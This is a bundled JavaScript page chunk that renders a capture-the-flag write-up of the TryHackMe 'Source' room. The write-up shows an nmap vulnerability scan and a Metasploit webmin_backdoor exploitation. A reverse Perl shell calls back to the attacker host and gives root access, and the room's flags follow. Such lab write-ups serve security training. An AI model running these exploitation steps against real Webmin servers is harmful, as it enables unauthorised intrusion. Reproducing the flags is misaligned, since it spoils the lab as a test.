"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[9274],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>h});var r=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function a(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},i=Object.keys(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var l=r.createContext({}),c=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):a(a({},t),e)),n},p=function(e){var t=c(e.components);return r.createElement(l.Provider,{value:t},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,o=e.mdxType,i=e.originalType,l=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),u=c(n),d=o,h=u["".concat(l,".").concat(d)]||u[d]||m[d]||i;return n?r.createElement(h,a(a({ref:t},p),{},{components:n})):r.createElement(h,a({ref:t},p))}));function h(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var i=n.length,a=new Array(i);a[0]=d;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s[u]="string"==typeof e?e:o,a[1]=s;for(var c=2;c<i;c++)a[c]=n[c];return r.createElement.apply(null,a)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},22327:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>a,default:()=>m,frontMatter:()=>i,metadata:()=>s,toc:()=>c});var r=n(87462),o=(n(67294),n(3905));const i={},a="Source",s={unversionedId:"Tryhackme/Source/Source",id:"Tryhackme/Source/Source",title:"Source",description:"Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.",source:"@site/writeups/Tryhackme/Source/Source.md",sourceDirName:"Tryhackme/Source",slug:"/Tryhackme/Source/",permalink:"/writeups/Tryhackme/Source/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Smag Grotto",permalink:"/writeups/Tryhackme/Smag Grotto/"},next:{title:"Splunk",permalink:"/writeups/Tryhackme/Splunk/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Embark",id:"task-1-embark",level:2}],p={toc:c},u="wrapper";function m(e){let{components:t,...n}=e;return(0,o.kt)(u,(0,r.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"source"},"Source"),(0,o.kt)("p",null,"Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/source"},"Source")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Metasploit (webmin_backdoor)")),(0,o.kt)("h2",{id:"task-1-embark"},"Task 1 Embark"),(0,o.kt)("p",null,"Enumerate and root the box attached to this task. Can you discover the source of the disruption and leverage it to take control?"),(0,o.kt)("p",null,"This virtual machine is also included in the room ",(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/attackerkb"},"AttackerKB")," as part of a guided experience. Additionally, you can download the OVA of Source for offline usage from ",(0,o.kt)("a",{parentName:"p",href:"https://www.darkstar7471.com/resources.html"},"https://www.darkstar7471.com/resources.html")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Source$ sudo nmap -A -sS -sC -sV --script vuln -O 10.10.71.192\n[sudo] password for kali: \nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 14:14 CEST\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nNmap scan report for 10.10.71.192\nHost is up (0.063s latency).\nNot shown: 998 closed ports\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n| vulners: \n|   cpe:/a:openbsd:openssh:7.6p1: \n|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111\n|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919\n|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473\n|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905\n|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110\n|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109\n|_      CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685\n10000/tcp open  http    MiniServ 1.890 (Webmin httpd)\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n|_http-csrf: Couldn't find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn't find any DOM based XSS.\n| http-litespeed-sourcecode-download: \n| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)\n| /index.php source code:\n| <h1>Error - Document follows</h1>\n|_<p>This web server is running in SSL mode. Try the URL <a href='https://ip-10-10-71-192.eu-west-1.compute.internal:10000/'>https://ip-10-10-71-192.eu-west-1.compute.internal:10000/</a> instead.<br></p>\n|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)\n| http-phpmyadmin-dir-traversal: \n|   VULNERABLE:\n|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion\n|     State: UNKNOWN (unable to test)\n|     IDs:  CVE:CVE-2005-3299\n|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.\n|       \n|     Disclosure date: 2005-10-nil\n|     Extra information:\n|       ../../../../../etc/passwd :\n|   <h1>Error - Document follows</h1>\n|   <p>This web server is running in SSL mode. Try the URL <a href='https://ip-10-10-71-192.eu-west-1.compute.internal:10000/'>https://ip-10-10-71-192.eu-west-1.compute.internal:10000/</a> instead.<br></p>\n|   \n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299\n|_      http://www.exploit-db.com/exploits/1244/\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n| http-vuln-cve2006-3392: \n|   VULNERABLE:\n|   Webmin File Disclosure\n|     State: VULNERABLE (Exploitable)\n|     IDs:  CVE:CVE-2006-3392\n|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.\n|       This allows arbitrary files to be read, without requiring authentication, using \"..%01\" sequences\n|       to bypass the removal of \"../\" directory traversal sequences.\n|       \n|     Disclosure date: 2006-06-29\n|     References:\n|       http://www.exploit-db.com/exploits/1997/\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392\n|_      http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=44379%PV=Y%DS=2%DC=T%G=Y%TM=5F86EB\nOS:E4%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC\nOS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 110/tcp)\nHOP RTT      ADDRESS\n1   35.81 ms 10.8.0.1\n2   76.08 ms 10.10.71.192\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 90.10 seconds\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"msf5 > search webmin\n\nMatching Modules\n================\n\n   #  Name                                         Disclosure Date  Rank       Check  Description\n   -  ----                                         ---------------  ----       -----  -----------\n   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access\n   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure\n   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor\n   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution\n   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution\n   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE\n\n\nInteract with a module by name or index, for example use 5 or use exploit/unix/webapp/webmin_upload_exec\nmsf5 > use 2\n[*] Using configured payload cmd/unix/reverse_perl\nmsf5 exploit(linux/http/webmin_backdoor) > show options\n\nModule options (exploit/linux/http/webmin_backdoor):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT      10000            yes       The target port (TCP)\n   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.\n   SRVPORT    8080             yes       The local port to listen on.\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI  /                yes       Base path to Webmin\n   URIPATH                     no        The URI to use for this exploit (default is random)\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (cmd/unix/reverse_perl):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST                   yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic (Unix In-Memory)\n\n\nmsf5 exploit(linux/http/webmin_backdoor) > set LHOST 10.8.106.222\nLHOST => 10.8.106.222\nmsf5 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.10.71.192\nRHOSTS => 10.10.71.192\nmsf5 exploit(linux/http/webmin_backdoor) > set ssl true\n[!] Changing the SSL option's value may require changing RPORT!\nssl => true\nmsf5 exploit(linux/http/webmin_backdoor) > set rport 10000\nrport => 10000\nmsf5 exploit(linux/http/webmin_backdoor) > run\n\n[*] Started reverse TCP handler on 10.8.106.222:4444 \n[*] Configuring Automatic (Unix In-Memory) target\n[*] Sending cmd/unix/reverse_perl command payload\n[*] Command shell session 1 opened (10.8.106.222:4444 -> 10.10.71.192:48304) at 2020-10-14 14:17:36 +0200\nid\nuid=0(root) gid=0(root) groups=0(root)\npython -c \"import pty;pty.spawn('/bin/bash')\"\nroot@source:/usr/share/webmin/# ls -l /home\nls -l /home\ntotal 4\ndrwxr-xr-x 5 dark dark 4096 Jun 26 04:46 dark\nroot@source:/usr/share/webmin/# cat /home/dark/user.txt\ncat /home/dark/user.txt\nTHM{SUPPLY_CHAIN_COMPROMISE}\nroot@source:/usr/share/webmin/# cat /root/root.txt\ncat /root/root.txt\nTHM{UPDATE_YOUR_INSTALL}\nroot@source:/usr/share/webmin/#\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"user.txt")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{SUPPLY_CHAIN_COMPROMISE}")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"root.txt")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{UPDATE_YOUR_INSTALL}")))}m.isMDXComponent=!0}}]);